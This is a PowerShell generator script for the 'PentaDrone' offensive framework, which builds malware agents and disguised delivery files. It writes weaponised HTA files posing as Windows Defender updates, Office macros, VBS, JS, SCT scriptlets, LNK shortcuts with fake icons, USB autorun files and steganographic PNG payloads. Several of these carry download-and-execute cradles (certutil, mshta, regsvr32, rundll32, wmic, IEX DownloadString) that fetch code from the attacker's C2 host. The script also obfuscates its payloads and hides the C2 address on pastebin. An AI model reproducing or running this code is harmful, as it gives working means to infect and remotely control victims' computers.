##########################################################################################
# Generator v3.0 
# Generate pentaDrone Offensives Assets
#      --
#    Copyright (C) 2020 
#   Author : @thebenygreen - @eyesopensec
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
##########################################################################################

Write-Host "PentaDrone Generator v3.0 " -ForegroundColor DarkGreen;
Write-Host "Generate pentaDrone Agents, Offensives Assets and C2 files
 - by @thebenygreen - @eyesopensec 
 
 ======================================================================
 " 

############## ENCRYPTION BLOCK ##########################################################
function Create-AesManagedObject($key, $IV) {
			$aesManaged = New-Object "System.Security.Cryptography.AesManaged"
			$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
			$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
			$aesManaged.BlockSize = 128
			$aesManaged.KeySize = 256
			if ($IV) {
				if ($IV.getType().Name -eq "String") {
					$aesManaged.IV = [System.Convert]::FromBase64String($IV)
				}
				else {
					$aesManaged.IV = $IV
				}
			}
			if ($key) {
				if ($key.getType().Name -eq "String") {
					$aesManaged.Key = [System.Convert]::FromBase64String($key)
				}
				else {
					$aesManaged.Key = $key
				}
			}
			$aesManaged
		}		 
function Create-AesKey() {
			$aesManaged = Create-AesManagedObject
			$aesManaged.GenerateKey()
			
			[System.Convert]::ToBase64String($aesManaged.Key)
		}		 
function Encrypt-String($key, $unencryptedString) {
			$bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
			$aesManaged = Create-AesManagedObject $key 
			
			$encryptor = $aesManaged.CreateEncryptor()
			$encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
			[byte[]] $fullData = $aesManaged.IV + $encryptedData
			$aesManaged.Dispose()
			[System.Convert]::ToBase64String($fullData)
		}		 
function Decrypt-String($key, $encryptedStringWithIV) {
	$bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
	$IV = $bytes[0..15]
	$aesManaged = Create-AesManagedObject $key $IV
	$decryptor = $aesManaged.CreateDecryptor();
	$unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
	#$aesManaged.Dispose()
	[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
	}
##########################################################################################

# Get full path of the actual script
$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
If (Test-Path  $ScriptDir\Package){ } else { New-Item -Path $ScriptDir -Name "Package" -ItemType "directory" }

$choice0 = Read-Host -Prompt 'Do you need to setup persistence for your C2 URL ? (y/n)'
if ($choice0 -eq "y") {
function PastebinStoredC2Value ($MyC2Url) {
	$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
	$key = Create-AesKey
	echo "Edit CONFIG.ini with keytoreadgetc2 ---->   $key" >  $ScriptDir\prepareC2.txt
	$unencryptedString = $MyC2Url
	$encryptedString = Encrypt-String $key $unencryptedString
	echo "C2 URL encrypted string ---->   $encryptedString" >>  $ScriptDir\prepareC2.txt
	
	$backToPlainText = Decrypt-String $key $encryptedString
	if ($unencryptedString -ne $backToPlainText) {
		echo "encryption didnt work!" >>  $ScriptDir\check_c2url_retreive.txt
	}
	else {
		echo "Test decryption ---->   $backToPlainText" >>  $ScriptDir\prepareC2.txt
	}
}

Write-Host "WHAT IS C2 URL KEY ?
-------------------------------------
It's IMPORTANT that your C2 URL not be static so that if that URL is blocked you can change it and continue to operate.
You can change it at your convenience by using an encrypted file containing the actual URL on Internet.
Each time the zombie want to contact C2, it will check for actual C2 URL by obtaining and decrypting the C2 URL stored in that file.
The next steps will help you to setup this C2 persistence process.
"

$ngrokUrl = Read-Host -Prompt 'Type your C2 URL (it can be tor,ngrok,...) example (follow exactly this typo) No "/" at the end --> http://127.0.0.1'
PastebinStoredC2Value $ngrokUrl

Write-Host " 1-  'PrepareC2.txt' file have been generated it contain all the encrypted value you need to terminate this C2 persistence setup process
Now you must edit and save your 'CONFIG.ini' before CONTINUE.
You have to change the key value 'keytoreadgetc2' of 'CONFIG.INI' by the one generated in 'PrepareC2.txt'.
By doing so, your agent will be able to decrypt C2 URL encrypted string

"
#$ooo = Read-Host -Prompt ' Press ENTER to OPEN FILES !'
#start $ScriptDir\prepareC2.txt
#start $ScriptDir\config.ini
#$ooo = Read-Host -Prompt ' Press ENTER to continue !'
Write-Host "2-  Once you have finished to update 'CONFIG.INI'  
You need to host or store over Internet a file containing only the C2 URL encrypted string provided in your 'prepareC2.txt' file (you can use pastebin service-like).
	>>> Example: Go to pastebin.com and crete a new paste containing only C2 URL encrypted string, something like: TUtAdo8fKzUeKEdcO3LWyJW/LWsZfayDHHeLHqerEKK
And Edit 'getC2' key value in your 'CONFIG.ini' to point to the URL of the file you will host or store over Internet, save 'CONFIG.INI' and close it.
	>>> Example: getC2=https://https://pastebin.com/raw/xxxxx

"
$ooo = Read-Host -Prompt 'Press ENTER to OPEN FILES !'
start $ScriptDir\prepareC2.txt
start $ScriptDir\config.ini
$ooo = Read-Host -Prompt ' Press ENTER to continue !'
}

################# CLIENT GENERATION #################################################
$choice1 = Read-Host -Prompt 'Do you want to generate client files ? (y/n)'
if ($choice1 -eq "y") {
If (Test-Path  $ScriptDir\Package\Client){ Remove-Item -path $ScriptDir\Package\Client }
New-Item -Path $ScriptDir\Package -Name "Client" -ItemType "directory"
Write-Host "Reading parameters from 'config.ini' file..." -ForegroundColor DarkGreen;
Get-Content "$ScriptDir\config.ini" | ForEach-Object -Begin {$settings=@{}} -Process {$store = [regex]::split($_,'='); if(($store[0].CompareTo("") -ne 0) -and ($store[0].StartsWith("[") -ne $True) -and ($store[0].StartsWith("#") -ne $True)) {$settings.Add($store[0], $store[1])}}
#If (Test-Path  $ScriptDir\Package\Client){ Remove-Item -path $ScriptDir\Package\Client }
# Organize command in a block and execute that block
$md = {
#md Output;
md hta;
md png;
md exe;
md xls;
md sct;
md js ;
md bat;
md lnk;
md usb;
md c2c;
md zxd;
md vbs;
md ico;
}
& $md
Write-Host "Integrating parameters from 'config.ini' file in variables... `n" -ForegroundColor DarkGreen;
#$usbspreading = $settings.Get_Item("usbspreading")
$getc2 = $settings.Get_Item("getC2")
$keyreadgetC2 = $settings.Get_Item("keyreadgetC2")
$rootfolder = $settings.Get_Item("rootfolder")
$linkfolder = $settings.Get_Item("linkfolder")
$ops = $settings.Get_Item("ops")
$upgradepshell = $settings.Get_Item("upgradepshell")
$offlinemode = $settings.Get_Item("offlinemode")
$sleeptime1 = $settings.Get_Item("sleeptime1")
$sleeptime2 = $settings.Get_Item("sleeptime2")
$sleeptime3 = $settings.Get_Item("sleeptime3")
$evilimage = $settings.Get_Item("evilimage")
if (!$evilimage ) {$evilimage = "$ScriptDir\Build\dog.png" }
$lnkicon = $settings.Get_Item("lnkicon")
$lnkname = $settings.Get_Item("lnkname")
$enddate = $settings.Get_Item("enddate")
$workstart = $settings.Get_Item("workstart")
$workend = $settings.Get_Item("workend")
$keyupload = $settings.Get_Item("keyupload")
$keyupload2 = $settings.Get_Item("keyupload2")
$autopersist = $settings.Get_Item("autopersist")
$defaultpersist = $settings.Get_Item("defaultpersist")
$regkey = $settings.Get_Item("regkey")
$wmikey = $settings.Get_Item("wmikey")
$passcrypt = $settings.Get_Item("passcrypt")
$thatsalt = $settings.Get_Item("salt")
$obfuscationToken = $settings.Get_Item("obfuscationToken")
$c2channel = $settings.Get_Item("c2channel")
Import-Module "$ScriptDir\Build\obfuscator\Invoke-Obfuscation.psd1"

$getc2

function TestInternet { # Test internet connexion
	[CmdletBinding()] 
	param() 
	process { 
	[Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]'{DCB00C01-570F-4A9B-8D69-199FDBA5723B}')).IsConnectedToInternet 
	}  
} 
$t = TestInternet

$c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("$getc2")
Write-Host "Cypher text: $c2cEncrypted" 
if ($keyreadgetC2.length -eq 43) {$keyreadgetC2 = $keyreadgetC2 + '=' }
if ($keyreadgetC2.length -eq 42) {$keyreadgetC2 = $keyreadgetC2 + '==' }
Write-Host "Decryption Key:  $keyreadgetC2" 
Write-Host "Decryption of C2C URL string value ....." -ForegroundColor Yellow;
$c2c = Decrypt-String "$keyreadgetC2" "$c2cEncrypted" 

echo "RESULT: $c2c ..."

while ($t -eq $False) { #check internet connexion before continue (wait until internet is up)
	$t = TestInternet
	Start-Sleep -Seconds 10 
	echo "Need ACTIVE INTERNET CONNEXION !!! "
	if ($t -eq $True) {
	$c2c = (New-Object System.Net.WebClient).DownloadString("$getc2")
    $c2c	
		while (!$c2c) {
			$c2c = (New-Object System.Net.WebClient).DownloadString("$getc2")
			echo "$c2c - EMPTY !!! "	
			Start-Sleep -Seconds 5
			if ($c2c){
				[string]$enc = (cmd /c echo {IEX ((New-Object Net.WebClient).DownloadString("$c2c/$rootfolder/$linkfolder/pnt.ps1"))}).split(' ')[1] 
			break	}
		}
	break}
}
Start-Sleep -Seconds 3

$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
(get-content $ScriptDir\Build\zxd.ps1) | foreach-object {$_ -replace "ROOT_FOLDER", "$rootfolder" -replace "SERVER_IP_ADDRESS", "$c2c" -replace "LINK_FOLDER", "$linkfolder" } | set-content .\zxd.ps1	
Start-Sleep -Seconds 2
Import-Module .\zxd.ps1
[string]$enc = zxd_generateEncoded

# Displaying the parameters
Write-Host "Get C2 value - C2 value is:" $c2c -ForegroundColor DarkRed;
Write-Host "Encoded version :" $enc;
Set-Content .\zxd\encoded.txt -Value $enc

#Remove comments  --- Remove-Comments
$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
Import-Module $ScriptDir\Build\obfuscator\CleanComments.ps1
copy $ScriptDir\Build\agent_pnt.ps1 .\agent_pnt.ps1
copy $ScriptDir\Build\appdat.ps1 .\appdat.ps1
CleanComments -Path .\agent_pnt.ps1| set-content .\agent_pnt.ps1
CleanComments -Path .\appdat.ps1 | set-content .\appdat.ps1

$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
(get-content $ScriptDir\Build\agent.ps1) | foreach-object {$_ -replace "GETC2URL", "$getc2" -replace "KEYTOREADGETC2", "$keyreadgetC2" -replace "UPGRADEPOWERSHELL", "$upgradepshell" -replace "ROOT_FOLDER", "$rootfolder"  -replace "LINK_FOLDER", "$linkfolder" -replace "MYOPS", "$ops" -replace "SLPTM1", "$sleeptime1" -replace "SLPTM2", "$sleeptime2" -replace "SLPTM3", "$sleeptime3" -replace "ENDDATE", "$enddate" -replace "WORKSTART", "$workstart" -replace "WORKEND", "$workend" -replace "KEYUPLOAD", "$keyupload" -replace "KEYUPLOAD", "$keyupload2"  -replace "AUTOPERSIST", "$autopersist"  -replace "DEFAULTPERSIST", "$defaultpersist" -replace "REGKEY", "$regkey"  -replace "WMIKEY", "$wmikey"  -replace "MYENCODED", "$enc" -replace "C2CHANNEL", "$c2channel" } | set-content .\temp.ps1
CleanComments -Path .\temp.ps1| set-content .\payload.ps1
set-content .\temp.ps1 -Value ""
Remove-Item -path .\temp.ps1 -recurse
$ooo = Read-Host -Prompt 'OK'

Write-Host "--------------> 10 %" -ForegroundColor DarkGreen;
Start-Sleep -Seconds 2
function Out-EncryptedScript {
[CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $ScriptPath,
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Password,
        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $Salt,
        [Parameter(Position = 3)]
        [String]
        $InitializationVector = ( @( foreach ($i in 1..16) { [Char](Get-Random -Min 0x41 -Max 0x5B) } ) -join '' ), # Generate random 16 character IV
        [Parameter(Position = 4)]
        [String]
        $FilePath = ".\c2c\pntx.ps1"
    )

    $AsciiEncoder = New-Object System.Text.ASCIIEncoding
    $ivBytes = $AsciiEncoder.GetBytes("SORRYYOUAREPWNED!")
    # While this can be used to encrypt any file, it's primarily designed to encrypt itself.
    [Byte[]] $scriptBytes = Get-Content -Encoding byte -Path $ScriptPath
    $DerivedPass = New-Object System.Security.Cryptography.PasswordDeriveBytes($Password, $AsciiEncoder.GetBytes($Salt), "SHA1", 2)
    $Key = New-Object System.Security.Cryptography.RijndaelManaged
    $Key.Mode = [System.Security.Cryptography.CipherMode]::CBC
    [Byte[]] $KeyBytes = $DerivedPass.GetBytes(32)
    $Encryptor = $Key.CreateEncryptor($KeyBytes, $ivBytes)
    $MemStream = New-Object System.IO.MemoryStream
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemStream, $Encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $CryptoStream.Write($scriptBytes, 0, $scriptBytes.Length)
    $CryptoStream.FlushFinalBlock()
    $CipherTextBytes = $MemStream.ToArray()
    $MemStream.Close()
    $CryptoStream.Close()
    $Key.Clear()
    $Cipher = [Convert]::ToBase64String($CipherTextBytes)
# Generate encrypted PS1 file. All that will be included is the base64-encoded ciphertext and a slightly 'obfuscated' decrypt function
$Output = 'function de([String] $b, [String] $c) 
{ 
$a = "'
$Output += $cipher
$Output += '"'
$Output += '; 
$encoding = New-Object System.Text.ASCIIEncoding; 
$dd = $encoding.GetBytes("SORRYYOUAREPWNED!"); 
$aa = [Convert]::FromBase64String($a); 
$derivedPass = New-Object System.Security.Cryptography.PasswordDeriveBytes($b, $encoding.GetBytes($c), "SHA1", 2); 
[Byte[]] $e = $derivedPass.GetBytes(32); 
$f = New-Object System.Security.Cryptography.RijndaelManaged; 
$f.Mode = [System.Security.Cryptography.CipherMode]::CBC; 
[Byte[]] $h = New-Object Byte[]($aa.Length); 
$g = $f.CreateDecryptor($e, $dd); 
$i = New-Object System.IO.MemoryStream($aa, $True); 
$j = New-Object System.Security.Cryptography.CryptoStream($i, $g, [System.Security.Cryptography.CryptoStreamMode]::Read); 
$r = $j.Read($h, 0, $h.Length); 
$i.Close(); 
$j.Close(); 
$f.Clear(); 
return $encoding.GetString($h,0,$h.Length); 
}'
    # Output decrypt function and ciphertext to evil.ps1
    Out-File -InputObject $Output -Encoding ASCII $FilePath
    Write-Verbose "Encrypted PS1 file saved to: $(Resolve-Path $FilePath)"

}
Out-EncryptedScript .\payload.ps1 $passcrypt $thatsalt

(get-content $ScriptDir\Build\agent_pnt.ps1) | foreach-object {$_ -replace "GETC2URL", "$getc2" -replace "KEYTOREADGETC2", "$keyreadgetC2" -replace "ROOT_FOLDER", "$rootfolder" -replace "LINK_FOLDER", "$linkfolder" -replace "PASSCRYPT", "$passcrypt" -replace "SALT", "$thatsalt" } | set-content .\c2c\pnt.ps1
$Pnt_Direct_Attack = Out-EncodedCommand -Path .\c2c\pnt.ps1 -NonInteractive -NoProfile -WindowStyle Hidden -EncodedOutput
set-content .\c2c\pnt-Encoded.bat -Value "powershell -exec bypass -Nol -Win Hidden -Enc $Pnt_Direct_Attack"
Write-Host "Encoded > \c2c\pnt-Encoded.bat"

(get-content $ScriptDir\Build\autorunTemplate.inf) | foreach-object {$_ -replace "LNKFILE", "$lnkname" -replace "LNKICON", "$lnkicon" } | set-content .\usb\autorun.inf
(get-content $ScriptDir\Build\appdat.ps1) | foreach-object {$_ -replace "LNKFILE", "$lnkname" -replace "LNKICON", "$lnkicon" -replace "ENCODED", "$enc" } | set-content .\c2c\appdat.ps1
Write-Host "--------------> 20 %" -ForegroundColor DarkGreen;
#set-content .\agent.ps1 -Value ""
set-content .\agent_pnt.ps1 -Value ""

#set-content .\generator.ps1 -Value ""
set-content .\zxd.ps1 -Value ""
#Rename-Item .\agent.ps1 brib1.txt
Rename-Item .\agent_pnt.ps1 brib2.txt
#Rename-Item .\generator.ps1 brib3.txt
Rename-Item .\zxd.ps1 brib4.txt
Rename-Item .\appdat.ps1 brib5.txt
#attrib -h .\payload.ps1
#Remove-Item -path .\brib1.txt -recurse
Remove-Item -path .\brib2.txt -recurse
#Remove-Item -path .\brib3.txt -recurse
Remove-Item -path .\brib4.txt -recurse
Remove-Item -path .\brib5.txt -recurse

Write-Host "--------------> 30 %" -ForegroundColor DarkGreen;
$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
function Out-HTA {
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments,
        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $VBFilename="launchps.vbs",
        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $HTAFilePath="$pwd\WindDefefender_WebUpdate.hta",
        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $VBFilepath="$pwd\launchps.vbs"
    )
    if(!$Payload)
    {
        $Payload = "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $enc;$Arguments"
    }
    
    $HTA = @"
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
    <title>Windows Defender Web Install</title>
    <script src="$VBFilename" type="text/vbscript" >
    </script>
    <hta:application
       id="oHTA"
       applicationname="Windows Defender Web Install"
       application="yes"
    >
    </hta:application>
    </head>

    <SCRIPT TYPE="text/javascript">
    function start(){

    Initialize();

    }
    //-->
    </SCRIPT>
    <div> 
    <object type="text/html" data="http://windows.microsoft.com/en-IN/windows7/products/features/windows-defender" width="100%" height="100%">
    </object></div>   
 
  
    <body onload="start()">
    </body>
    </html>
"@
    $vbsscript = @"
    Sub Initialize()
    Set oShell = CreateObject( "WScript.Shell" )
    ps = "$Payload"
    oShell.run(ps),0,true
    End Sub
"@
    Out-File -InputObject $HTA -FilePath $HTAFilepath
    Out-File -InputObject $vbsscript -FilePath $VBFilepath
    Write-Output "HTA and VBS written to $HTAFilepath and $VBFilepath respectively."
}
Out-HTA -Payload "PowerShell -Exec Bypass -NoL -W Hidden -Enc $enc" -HTAFilepath .\hta\WinDefender_WebUpdate.hta -VBFilepath .\hta\launch.vbs

Write-Host "--------------> 40 %" -ForegroundColor DarkGreen;
function Out-VBSMacro {
$weapon = "powershell.exe -Exec Bypass -NoL -Nop -Win hidden -Enc $enc"

<#	$macrovbs = @"
Sub Auto_Open()
Sheets("Access denied").Visible = True
Sheets("Access denied").Select
Sheets("Protected").Visible = False
Dim strCommand As String
strCommand = "$weapon"
Shell strCommand, 0
End Sub
"@#>

	$macrovbs = @"
Sub Auto_Open()
Dim strCommand As String
strCommand = "$weapon"
Shell strCommand, 0
End Sub
"@




	$macrovbs_w = @"
Sub Document_Open()
Dim strCommand As String
strCommand = "$weapon"
Shell strCommand, 0
End Sub
"@

	$vbsscript = @"
Dim objShell
Set objShell = WScript.CreateObject ("WScript.shell")
ps = "$weapon"
objShell.run(ps),0,true
Set objShell = Nothing
"@
	echo $vbsscript > .\vbs\agent.vbs
	echo $macrovbs > .\xls\macroexcel.vba
	echo $macrovbs_w > .\xls\macroword.vba	
	echo $macrovbs > .\c2c\macro.txt	
	}
Out-VBSMacro
set-content .\vbs\agent_vbs.bat -Value "wscript.exe /NoLogo /B .\agent.vbs"
Write-Host "Macro & VBS ready "

$callmacropack = @"
$ScriptDir\Build\macropack.exe -f .\macroexcel.vba -o -v .\macroexcel_obf.vba
$ScriptDir\Build\macropack.exe -f .\macroword.vba -o -v .\macroword_obf.vba
"@
set-content .\xls\macro_obfuscate.bat -Value $callmacropack

Write-Host "Macro obfuscated - Check Variables syntax before use "
Write-Host "-------------> 50 %" -ForegroundColor DarkGreen;

function Out-JS {
    [CmdletBinding()] Param(       
        [String]$Payload,
        [String]$OutputPath = "$pwd\style.js"
    )
	$Payload = "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $enc"
    $cmd = @"
c = "$Payload";
r = new ActiveXObject("WScript.Shell").Run(c,0,true);
"@
    Out-File -InputObject $cmd -FilePath $OutputPath -Encoding default
    Write-Output "Weaponized JS file written to $OutputPath"
	}
Out-JS -Payload "PowerShell -Exec Bypass -NoL -W Hidden -Enc $enc" -OutputPath .\js\style.js
copy .\js\style.js .\c2c
$runjs = @"
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");w=new%20ActiveXObject("WScript.Shell");try{v=w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer");q=v.split("=")[1].split(";")[0];h.SetProxy(2,q);}catch(e){}h.Open("GET","$c2c/$rootfolder/$linkfolder/style.js",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
"@
set-content .\js\stylejs.bat -Value $runjs

Write-Host "--------------> 70 %" -ForegroundColor DarkGreen;
function Out-SCT {
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments,
        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $OutputPath = "$pwd\UpdateCheck.xml"
    )
    if(!$Payload)
    {
        $Payload = @"
Set-Item Variable:/P0 'Net.WebClient';SI Variable:EJk '$PayloadURL';dir ect*;Set-Variable ex (.$ExecutionContext.InvokeCommand.GetCmdlet($ExecutionContext.InvokeCommand.GetCommandName('N*-O*',$TRUE,1))(Item Variable:/P0).Value);SI Variable:/z ((((Variable ex).Value|Get-Member)|?{(Get-Variable _ -ValueOn).Name-ilike'Op*ad'}).Name);Set-Variable ex (Variable ex).Value.((ChildItem Variable:z).Value).Invoke((ChildItem Variable:\EJk).Value);SI Variable:/H '';Try{While((Get-Variable H).Value+=[Char](Variable ex).Value.ReadByte()){}}Catch{};Invoke-Expression((Get-Variable H).Value)
"@
    }  
    $cmd = @"
<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="WinProcess"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >

    <script language="JScript">
		<![CDATA[
	
			ps = 'powershell.exe -w h -nol -nop -ep bypass -c ';
            c = "$Payload";
            r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
	
		]]>
	</script>
    </registration>

    <public>
    <method name="Exec"></method>
    </public>
	<script language="JScript">
		<![CDATA[
	        
            function Exec()
            {
			    ps = 'powershell.exe -w h -nol -nop -ep bypass ';
                c = "$Payload";
                r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
	        }
		]]>
</script>
</scriptlet>
"@

    Out-File -InputObject $cmd -FilePath $OutputPath -Encoding default
    Write-Output "Weaponized SCT file written to $OutputPath"
    Write-Output "Host $OutputPath on a web server."
}

#Out-SCT -Payload "PowerShell -Exec Bypass -NoL -W Hidden -Enc $enc"  -OutputPath .\sct\KB0985412
Out-SCT -OutputPath .\sct\KB0985412
copy .\sct\KB0985412 .\c2c
$sctfile = "regsvr32.exe /u /n /s /i:$c2c/$rootfolder/$linkfolder/KB0985412 scrobj.dll"
echo $sctfile > .\sct\sct.bat

Write-Host "Weaponized SCT file "
Write-Host "-----------> 80 %" -ForegroundColor DarkGreen;
function Out-LNK {
    [CmdletBinding()] Param(   
        [String] $Executable = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        [String] $Payload = " -Exec Bypass -nol -W hidden -Enc $enc",
        [String] $OutputPath ,
        [String] $Icon ,
		[String] $Description 
    )
    if(!$Payload)
    {  $Payload = " -Exec Bypass -nol -W hidden -Enc $enc"    }
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($OutputPath)
    $Shortcut.TargetPath = $Executable			
    $Shortcut.Description = $Description 
    $Shortcut.WindowStyle = 7
    $Shortcut.IconLocation = "$Icon"
    $Shortcut.Arguments = $Payload
    $Shortcut.Save()
    Write-Output "LNK file: $OutputPath"
	}
Out-LNK -OutputPath $pwd\Wordpad.lnk -Icon "C:\Program Files\Windows NT\Accessories\wordpad.exe,1" -Description "WordPad Document shortcut"
Out-LNK -OutputPath $pwd\Explorer.lnk -Icon "explorer.exe,0" -Description "Windows Explorer shortcut"
Out-LNK -OutputPath $pwd\Windows.lnk -Icon "explorer.exe,23" -Description "Windows Updates shortcut"
Out-LNK -OutputPath $pwd\Folder.lnk -Icon "explorer.exe,13" -Description "Folder shortcut"
Out-LNK -OutputPath $pwd\$lnkname -Icon "%SystemRoot%\system32\SHELL32.dll,7" -Description "Disk shortcut"

Write-Host "Weaponized LNK file "

function Out-Certutil {
	$Certutil = @"
certutil -urlcache -split -f $c2c/$rootfolder/$linkfolder/pnt.bat %temp%\p.bat
start %temp%\p.bat 
"@
	set-content .\bat\certutil.bat -Value $Certutil
	}
Out-Certutil
Write-Host "Weaponized CERTUTIL file "
	
function Out-Mshta {
	$mshta = @"
mshta.exe javascript:a=(GetObject("script:$c2c/$rootfolder/$linkfolder/KB0985412")).Exec();close();
"@
	set-content .\bat\mshta.bat -Value $mshta
	}
Out-Mshta
Write-Host "Weaponized MSHTA file "
	
function Out-RunDll {
	$rundll = @"
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:$c2c/$rootfolder/$linkfolder/KB0985412").Exec();
"@
	set-content .\bat\rundll.bat -Value $rundll
	}
Out-RunDLL
Write-Host "Weaponized RUNDLL32 file "
	
function Out-WinRM {
	$winrm = @"
winrm qc -q
winrm i c wmicimv2/Win32_Process @{CommandLine="PowerShell -Exec Bypass -NoL -W Hidden -Enc $enc"}
"@
	set-content .\bat\winrm.bat -Value $winrm
	}
Out-WinRM
Write-Host "Weaponized WINRM file "

function Out-Wmic {
	$xsl = @"
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
  <ms:script implements-prefix="user" language="Jscript">
  <![CDATA[
  var x = new ActiveXObject("WScript.Shell").Run("PowerShell -Exec Bypass -NoL -W Hidden -Enc $enc");
  ]]></ms:script>
</stylesheet>
"@
	set-content .\c2c\wmic.xsl  -Value $xsl
	$wmic = @"
wmic os get /format:"$c2c/$rootfolder/$linkfolder/wmic.xsl"
"@
	set-content .\bat\wmic.bat -Value $wmic
	}
Out-Wmic
Write-Host "Weaponized WMIC file "

function Out-PNG {
$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
Import-Module $ScriptDir\Build\stego.ps1
echo "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $enc" > .\bat\pnt.ps1
Set-PowerStego -Method Hide -ImageSource File -ImageSourcePath $evilimage -ImageDestinationPath .\png\image.png -PayloadSource Text -PayloadPath .\bat\pnt.ps1
Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath $c2c/$rootfolder/$linkfolder/image.png -PayloadSource Text -PayloadPath .\png\InfectWithPNG.txt
}
Out-PNG
copy $ScriptDir\Build\stego.ps1 .\stego.ps1
Write-Host "Weaponized PNG file : $evilimage" -ForegroundColor DarkGreen;
add-content ./stego.ps1 -Value "VAR_IMAGE_URL = Read-Host -Prompt 'Use your OWN URL. Type URL of Evil image : '" 
add-content ./stego.ps1 -Value "Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath VAR_IMAGE_URL -PayloadSource Text -PayloadPath .\InfectWithPNG.txt"

function Out-Obfuscate {
	Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString("$c2c/$rootfolder/$linkfolder/pnt.ps1")} -Command "$obfuscationToken .\bat\pnt-obfuscated.bat" -Quiet
	Write-Host "Obfuscate > \bat\pnt-obfuscated.bat"
	cscript.exe $ScriptDir\Build\obfuscator\vbs_obfuscator.vbs .\vbs\agent.vbs > .\vbs\agent_obfuscated.vbs
	}
Out-Obfuscate
Write-Host "Obfuscation OK " -ForegroundColor DarkGreen;
Write-Host "--------------> 90 %" -ForegroundColor DarkGreen;

echo "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $enc" > .\bat\pnt.bat
copy .\bat\pnt.bat .\c2c
copy .\c2c\pnt-Encoded.bat .\bat
copy .\png\image.png .\c2c
#move .\pnt.SED .\exe
#---Debug---
set-content .\payload.ps1 -Value ""
Rename-Item .\payload.ps1 note.txt
Remove-Item -path .\note.txt
#-----------
copy $ScriptDir\Build\index.html .\hta
copy $ScriptDir\Build\template.xlsm .\xls
copy $ScriptDir\Build\template.xls .\xls
copy $ScriptDir\Build\template.docm .\xls
copy $ScriptDir\Build\template.doc .\xls
copy $ScriptDir\Build\MacroPack.exe .\xls

#Remove-Item -path .\autorunTemplate.inf
Write-Host "."
Write-Host "."

$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
Import-Module $ScriptDir\Build\obfuscator\Invoke-CradleCrafter.psd1
$cradle = Invoke-CradleCrafter -Url "$c2c/$rootfolder/$linkfolder/pnt.ps1" -Command 'Memory\*\All\1' -Quiet  
set-content .\c2c\pnt-secured-iex.ps1 -Value $cradle
Write-Host "CradleCrafter > \c2c\pnt-secured-iex.ps1" -ForegroundColor DarkGreen;

$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
copy "$ScriptDir\Build\*.ico" .\ico
move .\ico "$ScriptDir\Package\Client"
move .\bat "$ScriptDir\Package\Client"
